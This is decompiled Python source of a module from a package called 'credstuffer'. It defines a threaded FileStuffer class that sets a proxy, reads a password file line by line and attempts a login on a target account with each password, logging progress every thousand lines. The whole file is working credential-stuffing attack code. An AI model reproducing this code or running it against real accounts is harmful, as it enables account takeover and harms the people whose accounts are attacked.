# uncompyle6 version 3.7.4
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: build/bdist.linux-x86_64/egg/credstuffer/file_stuffer.py
# Compiled at: 2020-04-05 08:14:43
# Size of source mod 2**32: 1297 bytes
import logging, threading
from credstuffer.stuffer import Stuffer

class FileStuffer(Stuffer, threading.Thread):
    __doc__ = ' class FileStuffer to execute the stuffing algorithm with files\n\n    USAGE:\n            filestuffer = Filestuffer(account=account, filepath=/tmp/)\n            filestuffer.start()\n    '

    def __init__(self, account, filepath):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('Create class FileStuffer')
        Stuffer.__init__(self, account=account)
        threading.Thread.__init__(self)
        self.filepath = filepath

    def run(self) -> None:
        """ executes the run thread for account logins """
        self.set_account_proxy()
        self.logger.info('Open file {} for stuffing'.format(self.filepath))
        with open((self.filepath), 'r', encoding='utf-8', errors='ignore') as (f):
            for lineno, line in enumerate(f):
                password = line.strip('\n')
                self.account_login(password=password)
                if lineno % 1000 == 0:
                    self.logger.info('File {} with line number {} and password {}'.format(self.filepath, lineno, password))